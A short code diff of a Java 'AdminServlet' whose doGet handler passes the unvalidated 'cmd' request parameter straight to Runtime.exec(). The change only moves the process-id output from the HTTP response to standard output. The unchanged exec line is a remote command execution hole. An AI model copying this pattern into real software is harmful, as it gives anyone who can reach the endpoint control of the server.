@@ -9,6 +9,6 @@ public class AdminServlet extends HttpServlet {
   protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
     String cmd = req.getParameter("cmd");
     Process p = Runtime.getRuntime().exec(cmd);
-    resp.getWriter().println(p.pid());
+    System.out.println(p.pid());
   }
 }
